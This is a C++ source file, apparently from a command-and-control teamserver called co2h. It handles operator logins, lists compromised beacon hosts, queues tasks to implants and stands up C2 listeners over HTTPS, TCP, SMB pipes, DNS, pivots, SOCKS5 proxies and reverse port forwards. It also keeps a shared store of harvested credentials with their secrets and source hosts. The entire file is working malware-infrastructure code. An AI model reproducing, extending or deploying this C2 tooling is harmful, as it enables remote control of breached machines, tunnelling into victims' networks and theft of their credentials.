#include "OperatorSession.hpp"
#include "../Core.hpp"
#include "../core/SessionRegistry.hpp"
#include "../core/TaskQueue.hpp"
#include "../db/Database.hpp"
#include "../listeners/https/HttpsListener.hpp"
#include "../listeners/https/RsaOaep.hpp"
#include "../listeners/pivot/PivotListener.hpp"
#include "../listeners/tcp/TcpListener.hpp"
#include "../listeners/smb/SmbListener.hpp"
#include "../listeners/socks5/Socks5Listener.hpp"
#include "../listeners/rportfwd/RportfwdListener.hpp"
#include "../listeners/dns/DnsListener.hpp"

#include <co2h/bytes.hpp>
#include <co2h/crypto.hpp>
#include <co2h/framing.hpp>
#include <co2h/kv.hpp>
#include <co2h/version.hpp>
#include <spdlog/spdlog.h>

#include <chrono>

namespace co2h::server { using namespace ::co2h::kv; }

namespace co2h::server {

OperatorSession::OperatorSession(std::shared_ptr<Core> core, SslStream&& stream)
    : core_(std::move(core)), stream_(std::move(stream)) {}

OperatorSession::~OperatorSession() = default;

void OperatorSession::start() {
    auto self = shared_from_this();
    stream_.async_handshake(asio::ssl::stream_base::server,
        [this, self](const std::error_code& ec) {
            if (ec) {
                spdlog::warn("operator TLS handshake failed: {}", ec.message());
                return;
            }
            do_read();
        });
}

void OperatorSession::close() {
    if (closed_) return;
    closed_ = true;
    std::error_code ec;
    stream_.lowest_layer().close(ec);
    core_->unregister_operator(shared_from_this());
}

void OperatorSession::do_read() {
    auto self = shared_from_this();
    stream_.async_read_some(asio::buffer(rbuf_),
        [this, self](const std::error_code& ec, std::size_t n) {
            if (ec) { close(); return; }
            on_read(n);
        });
}

void OperatorSession::on_read(std::size_t n) {
    decoder_.feed({rbuf_.data(), n});
    while (auto f = decoder_.next()) {
        process_frame(*f);
    }
    if (decoder_.too_large()) {
        spdlog::warn("operator frame too large");
        close();
        return;
    }
    do_read();
}

void OperatorSession::process_frame(const proto::Frame& f) {
    switch (f.type) {
        case proto::MsgType::Hello:     handle_hello(f.payload); break;
        case proto::MsgType::Auth:      handle_auth(f.payload); break;
        case proto::MsgType::Subscribe: handle_subscribe(f.payload); break;
        case proto::MsgType::Command:   handle_command(f.payload); break;
        case proto::MsgType::Ping: {
            enqueue_send(proto::MsgType::Pong, {});
            break;
        }
        case proto::MsgType::Bye:       close(); break;
        default: break;
    }
}

void OperatorSession::handle_hello(BytesView payload) {
    kv::Reader r{payload};
    auto major = r.get_u32("v_major").value_or(0);
    auto minor = r.get_u32("v_minor").value_or(0);
    if (major != ::co2h::kProtoVersionMajor) {
        kv::Writer w;
        w.put_str("err", "incompatible protocol version");
        auto body = w.finish();
        enqueue_send(proto::MsgType::HelloAck, body);
        close();
        return;
    }
    kv::Writer w;
    w.put_u32("v_major", ::co2h::kProtoVersionMajor);
    w.put_u32("v_minor", ::co2h::kProtoVersionMinor);
    w.put_str("product", ::co2h::kProductName);
    w.put_str("version", ::co2h::kProductVersion);
    auto body = w.finish();
    enqueue_send(proto::MsgType::HelloAck, body);
    (void)minor;
}

void OperatorSession::handle_auth(BytesView payload) {
    kv::Reader r{payload};
    auto user = r.get_str("username").value_or("");
    auto pass = r.get_str("password").value_or("");
    auto res = core_->auth()->authenticate(std::string{user}, std::string{pass});

    kv::Writer w;
    if (!res) {
        w.put_str("status", "error");
        w.put_str("reason", "invalid credentials");
        enqueue_send(proto::MsgType::AuthAck, w.finish());
        spdlog::warn("operator auth failed for '{}'", user);
        close();
        return;
    }
    authed_       = true;
    username_     = res->username;
    operator_id_  = res->operator_id;
    role_         = res->role;
    w.put_str("status", "ok");
    w.put_u64("operator_id", static_cast<std::uint64_t>(res->operator_id));
    w.put_str("role", res->role);
    enqueue_send(proto::MsgType::AuthAck, w.finish());
    core_->register_operator(shared_from_this());
    core_->db()->log_audit(username_, "login", "");
    spdlog::info("operator '{}' authenticated (id={})", username_, operator_id_);
}

void OperatorSession::handle_subscribe(BytesView payload) {
    kv::Reader r{payload};
    subscriptions_ = r.get_u32("mask").value_or(0xFFFFFFFFu);
}

void OperatorSession::handle_command(BytesView payload) {
    if (!authed_) { close(); return; }

    kv::Reader r{payload};
    auto rpc_id  = r.get_u64("id").value_or(0);
    auto name    = r.get_str("name").value_or("");

    if (name == proto::cmd::kListSessions) {
        kv::Writer w;
        auto v = core_->sessions().snapshot();
        w.put_u32("count", static_cast<std::uint32_t>(v.size()));
        for (std::size_t i = 0; i < v.size(); ++i) {
            auto& s = *v[i];
            auto idx = std::to_string(i);
            w.put_str("id_"          + idx, s.id);
            w.put_str("parent_id_"   + idx, s.parent_id);
            w.put_str("host_"        + idx, s.hostname);
            w.put_str("user_"        + idx, s.username);
            w.put_str("listener_"    + idx, s.listener);
            w.put_str("internal_ip_" + idx, s.internal_ip);
            w.put_str("external_ip_" + idx, s.external_ip);
            w.put_u32("pid_"         + idx, s.pid);
            w.put_str("arch_"        + idx, s.arch);
            w.put_str("os_"          + idx, s.os);
            // Время первого и последнего контакта — Unix timestamp в секундах.
            auto first_seen_sec = std::chrono::duration_cast<std::chrono::seconds>(
                s.first_seen.time_since_epoch()).count();
            w.put_u64("first_seen_"  + idx, static_cast<std::uint64_t>(first_seen_sec));
            auto last_seen_sec = std::chrono::duration_cast<std::chrono::seconds>(
                s.last_seen.time_since_epoch()).count();
            w.put_u64("last_seen_"   + idx, static_cast<std::uint64_t>(last_seen_sec));
        }
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kTaskBeacon) {
        auto bid    = std::string{r.get_str("beacon_id").value_or("")};
        auto op     = static_cast<proto::TaskOp>(r.get_u32("op").value_or(0));
        auto pl_opt = r.get_bytes("payload");
        Bytes pl;
        if (pl_opt) pl.assign(pl_opt->begin(), pl_opt->end());
        // Читаем необязательное поле cmd_text — полная команда оператора
        // (для audit-рассылки; если не передано, формируем из op).
        auto cmd_text_sv = r.get_str("cmd_text").value_or("");
        std::string cmd_text{cmd_text_sv};

        auto tid = core_->tasks().enqueue(bid, op, std::move(pl), operator_id_);
        spdlog::info("task enqueued: beacon={} op={} tid={}", bid, static_cast<int>(op), tid);
        core_->db()->log_audit(username_, "beacon.task",
            bid + " op=" + std::to_string(static_cast<int>(op)));

        // Рассылка audit-события только операторам с ролью admin.
        {
            auto ts = static_cast<std::uint64_t>(
                std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::system_clock::now().time_since_epoch()).count());
            kv::Writer ae;
            ae.put_str("operator",  username_);
            ae.put_str("beacon_id", bid);
            ae.put_str("cmd_text",  cmd_text);
            ae.put_u64("ts",        ts);
            core_->broadcast_event_admin(proto::EventCategory::Audit, ae.finish());
        }

        kv::Writer w;
        w.put_u64("task_id", tid);
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kAddListener) {
        auto kind      = std::string{r.get_str("kind").value_or("")};
        auto lname     = std::string{r.get_str("listener_name").value_or("")};
        auto bind_host = std::string{r.get_str("bind_host").value_or("127.0.0.1")};
        auto bind_port = static_cast<std::uint16_t>(r.get_u32("bind_port").value_or(1080));
        auto beacon_id = std::string{r.get_str("beacon_id").value_or("")};

        if (lname.empty()) {
            kv::Writer w;
            w.put_str("error", "listener_name required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        if (core_->listeners().get(lname)) {
            kv::Writer w;
            w.put_str("error", "listener name already exists");
            send_response(rpc_id, 1, w.finish());
            return;
        }

        bool ok = false;

        if (kind == "pivot") {
            auto pivot_port = static_cast<std::uint16_t>(
                r.get_u32("pivot_port").value_or(4446));
            pivot::PivotConfig cfg;
            cfg.name       = lname;
            cfg.bind_host  = bind_host;
            cfg.pivot_port = pivot_port;
            cfg.socks_port = bind_port; // reuse bind_port as socks_port
            auto core_ref  = core_;
            ok = core_->listeners().add(lname, [core_ref, cfg]() {
                return std::make_shared<pivot::PivotListener>(core_ref, cfg);
            });
            kv::Writer w;
            if (ok) {
                spdlog::info("pivot listener '{}' pivot:{} socks:{}",
                             lname, pivot_port, bind_port);
                w.put_str("status", "ok"); w.put_str("name", lname);
                send_response(rpc_id, 0, w.finish());
            } else {
                w.put_str("error", "failed"); send_response(rpc_id, 1, w.finish());
            }
        } else if (kind == "tcp") {
            auto port = static_cast<std::uint16_t>(r.get_u32("bind_port").value_or(4444));
            tcp_raw::TcpConfig cfg;
            cfg.name      = lname;
            cfg.bind_host = bind_host.empty() ? "0.0.0.0" : bind_host;
            cfg.bind_port = port;
            // AES listener key — load from DB or generate + persist.
            auto stored_hex_tcp = core_->db()->get_listener_key_hex(lname);
            if (stored_hex_tcp && stored_hex_tcp->size() == 64) {
                auto raw = co2h::hex_decode(*stored_hex_tcp);
                if (raw.size() == 32)
                    std::copy(raw.begin(), raw.end(), cfg.listener_key.begin());
                else
                    stored_hex_tcp.reset();
            }
            if (!stored_hex_tcp || stored_hex_tcp->size() != 64) {
                crypto::random_bytes(cfg.listener_key.data(), cfg.listener_key.size());
                core_->db()->set_listener_key_hex(lname,
                    co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()}));
            }
            // RSA-2048 keypair — load from DB or generate + persist.
            if (!core_->db()->get_listener_rsa(lname, cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                if (!https::rsa_generate_2048(cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                    spdlog::warn("tcp listener '{}' RSA keypair gen failed", lname);
                    cfg.rsa_pub_blob.clear();
                    cfg.rsa_priv_blob.clear();
                } else {
                    core_->db()->set_listener_rsa(lname,
                        {cfg.rsa_pub_blob.data(),  cfg.rsa_pub_blob.size()},
                        {cfg.rsa_priv_blob.data(), cfg.rsa_priv_blob.size()});
                }
            }
            auto core_ref = core_;
            ok = core_->listeners().add(lname, [core_ref, cfg]() {
                return std::make_shared<tcp_raw::TcpListener>(core_ref, cfg);
            });
            kv::Writer w;
            if (ok) {
                auto khex   = co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()});
                auto pubhex = co2h::hex_encode({cfg.rsa_pub_blob.data(), cfg.rsa_pub_blob.size()});
                spdlog::info("tcp listener '{}' {}:{} started", lname, cfg.bind_host, port);
                w.put_str("status", "ok"); w.put_str("name", lname);
                w.put_str("key_hex", khex);
                w.put_str("pubkey_hex", pubhex);
                send_response(rpc_id, 0, w.finish());
            } else {
                w.put_str("error", "failed"); send_response(rpc_id, 1, w.finish());
            }
        } else if (kind == "smb") {
            auto pipe_name = std::string{r.get_str("pipe_name").value_or("co2h")};
            smb::SmbConfig cfg;
            cfg.name      = lname;
            cfg.pipe_name = pipe_name.empty() ? "co2h" : pipe_name;
            // AES listener key — load from DB or generate + persist.
            auto stored_hex_smb = core_->db()->get_listener_key_hex(lname);
            if (stored_hex_smb && stored_hex_smb->size() == 64) {
                auto raw = co2h::hex_decode(*stored_hex_smb);
                if (raw.size() == 32)
                    std::copy(raw.begin(), raw.end(), cfg.listener_key.begin());
                else
                    stored_hex_smb.reset();
            }
            if (!stored_hex_smb || stored_hex_smb->size() != 64) {
                crypto::random_bytes(cfg.listener_key.data(), cfg.listener_key.size());
                core_->db()->set_listener_key_hex(lname,
                    co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()}));
            }
            // RSA-2048 keypair — load from DB or generate + persist.
            if (!core_->db()->get_listener_rsa(lname, cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                if (!https::rsa_generate_2048(cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                    spdlog::warn("smb listener '{}' RSA keypair gen failed", lname);
                    cfg.rsa_pub_blob.clear();
                    cfg.rsa_priv_blob.clear();
                } else {
                    core_->db()->set_listener_rsa(lname,
                        {cfg.rsa_pub_blob.data(),  cfg.rsa_pub_blob.size()},
                        {cfg.rsa_priv_blob.data(), cfg.rsa_priv_blob.size()});
                }
            }
            auto core_ref = core_;
            ok = core_->listeners().add(lname, [core_ref, cfg]() {
                return std::make_shared<smb::SmbListener>(core_ref, cfg);
            });
            kv::Writer w;
            if (ok) {
                auto khex   = co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()});
                auto pubhex = co2h::hex_encode({cfg.rsa_pub_blob.data(), cfg.rsa_pub_blob.size()});
                spdlog::info("smb listener '{}' pipe={} started", lname, cfg.pipe_name);
                w.put_str("status", "ok"); w.put_str("name", lname);
                w.put_str("key_hex", khex);
                w.put_str("pubkey_hex", pubhex);
                send_response(rpc_id, 0, w.finish());
            } else {
                w.put_str("error", "failed"); send_response(rpc_id, 1, w.finish());
            }
        } else if (kind == "https") {
            auto cert_file    = std::string{r.get_str("cert_file").value_or("../certs/listener.crt")};
            auto key_file     = std::string{r.get_str("key_file").value_or("../certs/listener.key")};
            auto profile_path = std::string{r.get_str("profile_path").value_or("")};
            auto port         = static_cast<std::uint16_t>(r.get_u32("bind_port").value_or(443));
            https::HttpsConfig cfg;
            cfg.name      = lname;
            cfg.bind_host = bind_host.empty() ? "0.0.0.0" : bind_host;
            cfg.bind_port = port;
            cfg.cert_file = cert_file;
            cfg.key_file  = key_file;
            std::string perr;
            auto prof = https::load_profile(profile_path, perr);
            if (!prof) {
                kv::Writer w;
                w.put_str("error", "profile load failed: " + perr);
                send_response(rpc_id, 1, w.finish());
                return;
            }
            cfg.profile = *prof;
            auto stored_hex = core_->db()->get_listener_key_hex(lname);
            if (stored_hex && stored_hex->size() == 64) {
                auto raw = co2h::hex_decode(*stored_hex);
                if (raw.size() == 32)
                    std::copy(raw.begin(), raw.end(), cfg.listener_key.begin());
                else
                    stored_hex.reset();
            }
            if (!stored_hex || stored_hex->size() != 64) {
                cfg.listener_key = co2h::crypto::random_aes_key();
                core_->db()->set_listener_key_hex(lname,
                    co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()}));
            }
            // RSA-2048 keypair for per-session key wrapping. Persisted alongside
            // the AES listener key so beacons built earlier still validate.
            if (!core_->db()->get_listener_rsa(lname,
                                               cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                if (!https::rsa_generate_2048(cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                    kv::Writer w;
                    w.put_str("error", "rsa keypair generation failed");
                    send_response(rpc_id, 1, w.finish());
                    return;
                }
                core_->db()->set_listener_rsa(lname,
                    {cfg.rsa_pub_blob.data(),  cfg.rsa_pub_blob.size()},
                    {cfg.rsa_priv_blob.data(), cfg.rsa_priv_blob.size()});
            }
            auto core_ref = core_;
            ok = core_->listeners().add(lname, [core_ref, cfg]() {
                return std::make_shared<https::HttpsListener>(core_ref, cfg);
            });
            kv::Writer w;
            if (ok) {
                auto khex = co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()});
                auto pub_hex = co2h::hex_encode({cfg.rsa_pub_blob.data(), cfg.rsa_pub_blob.size()});
                spdlog::info("https listener '{}' {}:{} started", lname, cfg.bind_host, port);
                w.put_str("status", "ok");
                w.put_str("name", lname);
                w.put_str("key_hex", khex);
                w.put_str("pubkey_hex", pub_hex);
                send_response(rpc_id, 0, w.finish());
            } else {
                w.put_str("error", "failed (port busy or cert error?)");
                send_response(rpc_id, 1, w.finish());
            }
        } else if (kind == "socks5") {
            // SOCKS5 over C2 — трафик проходит через C2-канал указанного бикона.
            if (beacon_id.empty()) {
                kv::Writer w;
                w.put_str("error", "beacon_id required for socks5 listener");
                send_response(rpc_id, 1, w.finish());
                return;
            }
            auto port = static_cast<std::uint16_t>(r.get_u32("bind_port").value_or(1080));
            auto core_ref = core_;
            auto s5 = std::make_shared<socks5::Socks5Listener>(
                core_ref, lname,
                bind_host.empty() ? "127.0.0.1" : bind_host,
                port, beacon_id);
            ok = core_->listeners().add(lname, [s5]() { return s5; });
            if (ok) {
                // Зарегистрировать в Core для маршрутизации SOCKS output.
                core_->register_socks_listener(beacon_id, s5);
                spdlog::info("socks5 listener '{}' {}:{} beacon={}",
                             lname, bind_host, port, beacon_id);
                kv::Writer w;
                w.put_str("status", "ok"); w.put_str("name", lname);
                send_response(rpc_id, 0, w.finish());
            } else {
                kv::Writer w;
                w.put_str("error", "failed (port busy?)");
                send_response(rpc_id, 1, w.finish());
            }
        } else if (kind == "rportfwd") {
            // Обратный проброс порта: teamserver слушает на bind_port,
            // трафик идёт через бикон к rhost:rport.
            if (beacon_id.empty()) {
                kv::Writer w;
                w.put_str("error", "beacon_id required for rportfwd listener");
                send_response(rpc_id, 1, w.finish());
                return;
            }
            auto port  = static_cast<std::uint16_t>(r.get_u32("bind_port").value_or(8080));
            auto rhost = std::string{r.get_str("rhost").value_or("127.0.0.1")};
            auto rport = static_cast<std::uint16_t>(r.get_u32("rport").value_or(80));
            auto core_ref = core_;
            auto rpf = std::make_shared<rportfwd::RportfwdListener>(
                core_ref, lname,
                bind_host.empty() ? "127.0.0.1" : bind_host,
                port, beacon_id, rhost, rport);
            ok = core_->listeners().add(lname, [rpf]() { return rpf; });
            if (ok) {
                core_->register_rportfwd_listener(beacon_id, rpf);
                spdlog::info("rportfwd listener '{}' {}:{} beacon={} -> {}:{}",
                             lname, bind_host, port, beacon_id, rhost, rport);
                kv::Writer w;
                w.put_str("status", "ok"); w.put_str("name", lname);
                send_response(rpc_id, 0, w.finish());
            } else {
                kv::Writer w;
                w.put_str("error", "failed (port busy?)");
                send_response(rpc_id, 1, w.finish());
            }
        } else if (kind == "dns") {
            auto c2_domain = std::string{r.get_str("c2_domain").value_or("")};
            auto port      = static_cast<std::uint16_t>(r.get_u32("bind_port").value_or(53));
            if (c2_domain.empty()) {
                kv::Writer w;
                w.put_str("error", "c2_domain required for dns listener");
                send_response(rpc_id, 1, w.finish());
                return;
            }
            dns_c2::DnsConfig cfg;
            cfg.name      = lname;
            cfg.bind_host = bind_host.empty() ? "0.0.0.0" : bind_host;
            cfg.bind_port = port;
            cfg.c2_domain = c2_domain;
            // AES listener key — load from DB or generate + persist.
            auto stored_dns = core_->db()->get_listener_key_hex(lname);
            if (stored_dns && stored_dns->size() == 64) {
                auto raw = co2h::hex_decode(*stored_dns);
                if (raw.size() == 32)
                    std::copy(raw.begin(), raw.end(), cfg.listener_key.begin());
                else
                    stored_dns.reset();
            }
            if (!stored_dns || stored_dns->size() != 64) {
                crypto::random_bytes(cfg.listener_key.data(), cfg.listener_key.size());
                core_->db()->set_listener_key_hex(lname,
                    co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()}));
            }
            // RSA-2048 keypair for per-session key wrapping.
            if (!core_->db()->get_listener_rsa(lname, cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                if (!https::rsa_generate_2048(cfg.rsa_pub_blob, cfg.rsa_priv_blob)) {
                    spdlog::warn("dns listener '{}' RSA keypair gen failed", lname);
                    cfg.rsa_pub_blob.clear();
                    cfg.rsa_priv_blob.clear();
                } else {
                    core_->db()->set_listener_rsa(lname,
                        {cfg.rsa_pub_blob.data(),  cfg.rsa_pub_blob.size()},
                        {cfg.rsa_priv_blob.data(), cfg.rsa_priv_blob.size()});
                }
            }
            auto core_ref = core_;
            ok = core_->listeners().add(lname, [core_ref, cfg]() {
                return std::make_shared<dns_c2::DnsListener>(core_ref, cfg);
            });
            kv::Writer w;
            if (ok) {
                auto khex   = co2h::hex_encode({cfg.listener_key.data(), cfg.listener_key.size()});
                auto pubhex = co2h::hex_encode({cfg.rsa_pub_blob.data(), cfg.rsa_pub_blob.size()});
                spdlog::info("dns listener '{}' {}:{} domain={} started",
                             lname, cfg.bind_host, port, c2_domain);
                w.put_str("status", "ok"); w.put_str("name", lname);
                w.put_str("key_hex", khex);
                w.put_str("pubkey_hex", pubhex);
                send_response(rpc_id, 0, w.finish());
            } else {
                w.put_str("error", "failed (port busy?)");
                send_response(rpc_id, 1, w.finish());
            }
        } else {
            kv::Writer w;
            w.put_str("error", "unknown kind, use: https, tcp, smb, pivot, socks5, rportfwd, dns");
            send_response(rpc_id, 1, w.finish());
        }
        return;
    }

    if (name == proto::cmd::kDelListener) {
        auto lname = std::string{r.get_str("listener_name").value_or("")};
        if (lname.empty()) {
            kv::Writer w; w.put_str("error", "listener_name required");
            send_response(rpc_id, 1, w.finish()); return;
        }
        bool ok = core_->listeners().remove(lname);
        kv::Writer w;
        if (ok) {
            spdlog::info("listener '{}' removed by operator", lname);
            w.put_str("status", "ok");
            w.put_str("listener_name", lname);
            send_response(rpc_id, 0, w.finish());
        } else {
            spdlog::warn("kDelListener: listener '{}' not found", lname);
            w.put_str("error", "not found");
            send_response(rpc_id, 1, w.finish());
        }
        return;
    }

    if (name == proto::cmd::kChatSend) {
        auto text = std::string{r.get_str("text").value_or("")};
        if (text.empty()) {
            kv::Writer w;
            w.put_str("error", "empty text");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        // Время сообщения берём на сервере — единый источник истины,
        // чтобы операторы с разъехавшимися часами видели одинаковый порядок.
        auto ts = static_cast<std::uint64_t>(
            std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()).count());
        kv::Writer ev;
        ev.put_str("from", username_);
        ev.put_str("text", text);
        ev.put_u64("ts",   ts);
        core_->broadcast_event(proto::EventCategory::Chat, ev.finish());
        core_->db()->log_audit(username_, "chat.send", text);

        kv::Writer w;
        w.put_str("status", "ok");
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kCredsList) {
        auto rows = core_->db()->creds_list();
        kv::Writer w;
        w.put_u32("count", static_cast<std::uint32_t>(rows.size()));
        for (std::size_t i = 0; i < rows.size(); ++i) {
            const auto& c = rows[i];
            auto idx = std::to_string(i);
            w.put_u64("id_"     + idx, static_cast<std::uint64_t>(c.id));
            w.put_str("user_"   + idx, c.user);
            w.put_str("domain_" + idx, c.domain);
            w.put_str("kind_"   + idx, c.kind);
            w.put_str("secret_" + idx, c.secret);
            w.put_str("host_"   + idx, c.host);
            w.put_str("source_" + idx, c.source);
            w.put_str("note_"   + idx, c.note);
            w.put_str("by_"     + idx, c.added_by);
            w.put_u64("ts_"     + idx, static_cast<std::uint64_t>(c.added_at));
        }
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kCredsAdd) {
        CredentialRow c;
        c.user     = std::string{r.get_str("user").value_or("")};
        c.domain   = std::string{r.get_str("domain").value_or("")};
        c.kind     = std::string{r.get_str("kind").value_or("password")};
        c.secret   = std::string{r.get_str("secret").value_or("")};
        c.host     = std::string{r.get_str("host").value_or("")};
        c.source   = std::string{r.get_str("source").value_or("manual")};
        c.note     = std::string{r.get_str("note").value_or("")};
        c.added_by = username_;
        c.added_at = std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::system_clock::now().time_since_epoch()).count();
        if (c.user.empty()) {
            kv::Writer w; w.put_str("error", "user required");
            send_response(rpc_id, 1, w.finish()); return;
        }
        auto id = core_->db()->creds_add(c);
        core_->db()->log_audit(username_, "creds.add",
            c.domain + "\\" + c.user + " (" + c.kind + ")");

        // broadcast — все операторы перезагрузят список
        kv::Writer ev;
        ev.put_str("action", "add");
        ev.put_u64("id",     static_cast<std::uint64_t>(id));
        core_->broadcast_event(proto::EventCategory::Credentials, ev.finish());

        kv::Writer w;
        w.put_u64("id", static_cast<std::uint64_t>(id));
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kCredsDel) {
        // Параметр называется cred_id, чтобы не пересекаться с rpc id.
        auto id = static_cast<std::int64_t>(r.get_u64("cred_id").value_or(0));
        if (id <= 0) {
            kv::Writer w; w.put_str("error", "id required");
            send_response(rpc_id, 1, w.finish()); return;
        }
        bool ok = core_->db()->creds_del(id);
        core_->db()->log_audit(username_, "creds.del", std::to_string(id));

        if (ok) {
            kv::Writer ev;
            ev.put_str("action", "del");
            ev.put_u64("id",     static_cast<std::uint64_t>(id));
            core_->broadcast_event(proto::EventCategory::Credentials, ev.finish());
        }

        kv::Writer w;
        w.put_str("status", ok ? "ok" : "not_found");
        send_response(rpc_id, ok ? 0 : 1, w.finish());
        return;
    }

    if (name == proto::cmd::kListOperators) {
        if (role_ != "admin") {
            kv::Writer w; w.put_str("error", "admin role required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto ops = core_->db()->list_operators();
        kv::Writer w;
        w.put_u32("count", static_cast<std::uint32_t>(ops.size()));
        for (std::size_t i = 0; i < ops.size(); ++i) {
            const auto& o = ops[i];
            auto idx = std::to_string(i);
            w.put_u64("id_"        + idx, static_cast<std::uint64_t>(o.id));
            w.put_str("username_"  + idx, o.username);
            w.put_str("role_"      + idx, o.role);
            w.put_u64("created_"   + idx, static_cast<std::uint64_t>(o.created_at));
        }
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kAddOperator) {
        if (role_ != "admin") {
            kv::Writer w; w.put_str("error", "admin role required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto user = std::string{r.get_str("username").value_or("")};
        auto pass = std::string{r.get_str("password").value_or("")};
        auto orole = std::string{r.get_str("role").value_or("operator")};
        if (user.empty() || pass.empty()) {
            kv::Writer w; w.put_str("error", "username and password required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        if (orole != "admin" && orole != "operator") {
            kv::Writer w; w.put_str("error", "role must be admin or operator");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        if (core_->db()->find_operator(user)) {
            kv::Writer w; w.put_str("error", "username already exists");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto hash = crypto::password_hash(pass);
        if (hash.empty()) {
            kv::Writer w; w.put_str("error", "password hashing failed");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto new_id = core_->db()->add_operator(user, hash, orole);
        if (new_id <= 0) {
            kv::Writer w; w.put_str("error", "insert failed");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        core_->db()->log_audit(username_, "operator.add",
            user + " role=" + orole);
        spdlog::info("operator '{}' created '{}' role={}", username_, user, orole);
        kv::Writer w;
        w.put_u64("id", static_cast<std::uint64_t>(new_id));
        send_response(rpc_id, 0, w.finish());
        return;
    }

    if (name == proto::cmd::kSetOperatorPwd) {
        if (role_ != "admin") {
            kv::Writer w; w.put_str("error", "admin role required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto target_id = static_cast<std::int64_t>(r.get_u64("op_id").value_or(0));
        auto pass = std::string{r.get_str("password").value_or("")};
        if (target_id <= 0 || pass.empty()) {
            kv::Writer w; w.put_str("error", "op_id and password required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto hash = crypto::password_hash(pass);
        if (hash.empty()) {
            kv::Writer w; w.put_str("error", "password hashing failed");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        bool ok = core_->db()->set_operator_password(target_id, hash);
        core_->db()->log_audit(username_, "operator.set_password",
            std::to_string(target_id));
        kv::Writer w;
        w.put_str("status", ok ? "ok" : "not_found");
        send_response(rpc_id, ok ? 0 : 1, w.finish());
        return;
    }

    if (name == proto::cmd::kDelOperator) {
        if (role_ != "admin") {
            kv::Writer w; w.put_str("error", "admin role required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        auto target_id = static_cast<std::int64_t>(r.get_u64("op_id").value_or(0));
        if (target_id <= 0) {
            kv::Writer w; w.put_str("error", "op_id required");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        if (target_id == operator_id_) {
            kv::Writer w; w.put_str("error", "cannot delete yourself");
            send_response(rpc_id, 1, w.finish());
            return;
        }
        bool ok = core_->db()->delete_operator(target_id);
        core_->db()->log_audit(username_, "operator.del",
            std::to_string(target_id));
        kv::Writer w;
        w.put_str("status", ok ? "ok" : "not_found");
        send_response(rpc_id, ok ? 0 : 1, w.finish());
        return;
    }

    if (name == proto::cmd::kListListeners) {
        auto v = core_->listeners().list();
        kv::Writer w;
        w.put_u32("count", static_cast<std::uint32_t>(v.size()));
        for (std::size_t i = 0; i < v.size(); ++i) {
            auto idx = std::to_string(i);
            w.put_str("name_"      + idx, v[i]->name());
            w.put_str("kind_"      + idx, v[i]->kind());
            w.put_str("bind_"      + idx, v[i]->bind_addr());
            w.put_str("key_hex_"   + idx, v[i]->key_hex());
            w.put_str("pubkey_hex_"+ idx, v[i]->pubkey_hex());
            w.put_str("domain_"    + idx, v[i]->domain());
            w.put_str("uri_checkin_"    + idx, v[i]->uri_checkin());
            w.put_str("uri_task_"       + idx, v[i]->uri_task());
            w.put_str("uri_post_"       + idx, v[i]->uri_post());
            w.put_str("cookie_"         + idx, v[i]->metadata_cookie());
            w.put_str("ua_"             + idx, v[i]->user_agent());
        }
        send_response(rpc_id, 0, w.finish());
        return;
    }

    kv::Writer w;
    w.put_str("error", "unknown command");
    w.put_str("name", std::string{name});
    send_response(rpc_id, 1, w.finish());
}

void OperatorSession::send_event(proto::EventCategory cat, BytesView payload) {
    kv::Writer w;
    w.put_u32("cat", static_cast<std::uint32_t>(cat));
    w.put_bytes("data", payload);
    enqueue_send(proto::MsgType::Event, w.finish());
}

void OperatorSession::send_response(std::uint64_t rpc_id, int status,
                                    BytesView payload) {
    kv::Writer w;
    w.put_u64("id", rpc_id);
    w.put_u32("status", static_cast<std::uint32_t>(status));
    w.put_bytes("payload", payload);
    enqueue_send(proto::MsgType::Response, w.finish());
}

void OperatorSession::enqueue_send(proto::MsgType type, BytesView payload) {
    Bytes frame;
    encode_frame(frame, type, payload);
    bool need_write;
    {
        std::lock_guard lk{wmu_};
        wq_.push_back(std::move(frame));
        need_write = !writing_;
        writing_ = true;
    }
    if (need_write) do_write();
}

void OperatorSession::do_write() {
    Bytes* front;
    {
        std::lock_guard lk{wmu_};
        if (wq_.empty()) { writing_ = false; return; }
        front = &wq_.front();
    }
    auto self = shared_from_this();
    asio::async_write(stream_, asio::buffer(*front),
        [this, self](const std::error_code& ec, std::size_t) {
            if (ec) { close(); return; }
            {
                std::lock_guard lk{wmu_};
                wq_.pop_front();
            }
            do_write();
        });
}

}
